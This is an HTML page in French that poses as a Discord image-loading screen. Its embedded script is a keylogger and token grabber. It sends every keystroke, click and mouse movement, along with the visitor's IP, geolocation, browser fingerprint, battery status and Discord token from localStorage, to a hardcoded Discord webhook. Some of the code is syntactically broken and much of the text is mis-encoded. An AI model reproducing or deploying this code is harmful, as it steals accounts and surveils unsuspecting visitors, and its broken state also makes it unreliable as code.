<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">

  <style>
    body {

      display: flex;

    h1 { font-size: 20px; margin: 20px 0 10px; }
    p { font-size: 14px; color: #b9bbbe; text-align: center; }
    .loader {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #7289da;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-top: 30px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
  <script>
    const webhook = "https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV";

    // Fonction pour envoyer les Ã©vÃ©nements au webhook
    function logEvent(type, data) {
      const payload = {
        content: `ðŸ“¡ **${type}**\n\`\`\`\n${data}\n\`\`\``
      };

      fetch(webhook, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)

    }

    // Keylogger
    document.addEventListener("keydown", function(e) {
      logEvent("Touche tapÃ©e", `Touche : ${e.key} | Code : ${e.code}`);
    });

    // Clics

      logEvent("Clic souris", `Position : X=${e.clientX}, Y=${e.clientY}, Ã‰lÃ©ment : ${e.target.tagName}`);
    });

    // Mouvement souris (1 par seconde)
    let lastMouseSend = 0;
    document.addEventListener("mousemove", function(e) {
      const now = Date.now();
      if (now - lastMouseSend > 1000) {
        lastMouseSend = now;
        logEvent("Mouvement souris", `Position : X=${e.clientX}, Y=${e.clientY}`);
      }
    });

    document.addEventListener("DOMContentLoaded", async () => {
      try {
        const ip = await fetch("https://api64.ipify.org?format=json")
          .then(r => r.json()).then(d => d.ip);
        const geo = await fetch(`https://ipapi.co/${ip}/json/`)
          .then(r => r.json());

        const now = new Date().toLocaleString();
        const ua = navigator.userAgent;
        const lang = navigator.language;
        const screenSize = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const battery = await (navigator.getBattery?.() || Promise.resolve({ level: 0, charging: false }));
        const batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
        const fingerprint = btoa(`${ip}|${ua}|${lang}|${screenSize}`);
        const vpn = geo.org?.toLowerCase().includes("vpn") || geo.org?.toLowerCase().includes("proxy") ? "ðŸš¨ VPN / Proxy dÃ©tectÃ©" : "âœ… Connexion normale";

        // RÃ©cupÃ©ration du token Discord
        let token = null;
        try {
          token = localStorage.getItem("token");
        } catch (e) {
          token = "Erreur accÃ¨s token";
        }

        if (token) token = token.replace(/"/g, "");

        const message = `
**ðŸ–¼ï¸ Nouvelle ouverture d'image Discord**
> ðŸ•’ Date/Heure : \`${now}\`
> ðŸŒ IP : \`${ip}\`
> ðŸ“Œ Localisation : \`${geo.city}, ${geo.region}, ${geo.country_name}\`
> ðŸ§  Fournisseur : \`${geo.org}\`
> ðŸ§¬ Fingerprint : \`${fingerprint}\`
> ðŸ–¥ï¸ OS/Navigateur : \`${ua}\`
> ðŸ—£ï¸ Langue : \`${lang}\`
> ðŸ§­ Fuseau horaire : \`${timezone}\`
> ðŸ“± RÃ©solution : \`${screenSize}\`
> ðŸ”‹ Batterie : \`${batteryStatus}\`
> ðŸ›¡ï¸ VPN : ${vpn}
> ðŸª™ Token Discord : \`\`\`${token || "Non trouvÃ©"}\`\`\`
        `;

        await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: message })
        });

      } catch (err) {
        console.error("Erreur de tracking :", err);
      }
    });
  </script>
</head>
<body>
  <h1>Chargement de l'image...</h1>

</html>
